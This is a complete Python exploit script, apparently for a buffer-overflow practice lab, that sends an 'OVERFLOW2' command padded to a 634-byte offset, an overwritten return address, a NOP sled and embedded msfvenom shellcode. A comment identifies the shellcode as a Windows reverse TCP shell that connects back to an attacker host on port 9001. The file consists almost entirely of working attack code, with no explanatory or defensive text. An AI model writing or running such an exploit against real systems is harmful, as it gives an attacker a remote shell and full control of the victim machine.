#!/usr/bin/env python3

from pwn import *

host = "10.10.97.153"
port = 1337

s = remote(host, port)
s.settimeout(5)
total_length = 1000
offset = 634
new_eip = p32(0x62501203)
nop = b"\x90" * 10

buf =  b""
buf += b"\xfc\xbb\x42\x37\xa3\x2a\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xbe"
buf += b"\xdf\x21\x2a\x3e\x20\x46\xa2\xdb\x11\x46\xd0\xa8\x02"
buf += b"\x76\x92\xfc\xae\xfd\xf6\x14\x24\x73\xdf\x1b\x8d\x3e"
buf += b"\x39\x12\x0e\x12\x79\x35\x8c\x69\xae\x95\xad\xa1\xa3"
buf += b"\xd4\xea\xdc\x4e\x84\xa3\xab\xfd\x38\xc7\xe6\x3d\xb3"
buf += b"\x9b\xe7\x45\x20\x6b\x09\x67\xf7\xe7\x50\xa7\xf6\x24"
buf += b"\xe9\xee\xe0\x29\xd4\xb9\x9b\x9a\xa2\x3b\x4d\xd3\x4b"
buf += b"\x97\xb0\xdb\xb9\xe9\xf5\xdc\x21\x9c\x0f\x1f\xdf\xa7"
buf += b"\xd4\x5d\x3b\x2d\xce\xc6\xc8\x95\x2a\xf6\x1d\x43\xb9"
buf += b"\xf4\xea\x07\xe5\x18\xec\xc4\x9e\x25\x65\xeb\x70\xac"
buf += b"\x3d\xc8\x54\xf4\xe6\x71\xcd\x50\x48\x8d\x0d\x3b\x35"
buf += b"\x2b\x46\xd6\x22\x46\x05\xbf\x87\x6b\xb5\x3f\x80\xfc"
buf += b"\xc6\x0d\x0f\x57\x40\x3e\xd8\x71\x97\x41\xf3\xc6\x07"
buf += b"\xbc\xfc\x36\x0e\x7b\xa8\x66\x38\xaa\xd1\xec\xb8\x53"
buf += b"\x04\xa2\xe8\xfb\xf7\x03\x58\xbc\xa7\xeb\xb2\x33\x97"
buf += b"\x0c\xbd\x99\xb0\xa7\x44\x4a\xb5\x26\x4d\x96\xa1\x4a"
buf += b"\x51\x85\x18\xc2\xb7\xa3\x4a\x82\x60\x5c\xf2\x8f\xfa"
buf += b"\xfd\xfb\x05\x87\x3e\x77\xaa\x78\xf0\x70\xc7\x6a\x65"
buf += b"\x71\x92\xd0\x20\x8e\x08\x7c\xae\x1d\xd7\x7c\xb9\x3d"
buf += b"\x40\x2b\xee\xf0\x99\xb9\x02\xaa\x33\xdf\xde\x2a\x7b"
buf += b"\x5b\x05\x8f\x82\x62\xc8\xab\xa0\x74\x14\x33\xed\x20"
buf += b"\xc8\x62\xbb\x9e\xae\xdc\x0d\x48\x79\xb2\xc7\x1c\xfc"
buf += b"\xf8\xd7\x5a\x01\xd5\xa1\x82\xb0\x80\xf7\xbd\x7d\x45"
buf += b"\xf0\xc6\x63\xf5\xff\x1d\x20\x05\x4a\x3f\x01\x8e\x13"
buf += b"\xaa\x13\xd3\xa3\x01\x57\xea\x27\xa3\x28\x09\x37\xc6"
buf += b"\x2d\x55\xff\x3b\x5c\xc6\x6a\x3b\xf3\xe7\xbe\x3b\xf3"
buf += b"\x17\x41"

shellcode = buf     #msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x23\x3c\x83\xba" -f py

payload = [
    b"OVERFLOW2 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(buf)),

]
payload = b"".join(payload)
s.send(payload)
s.close()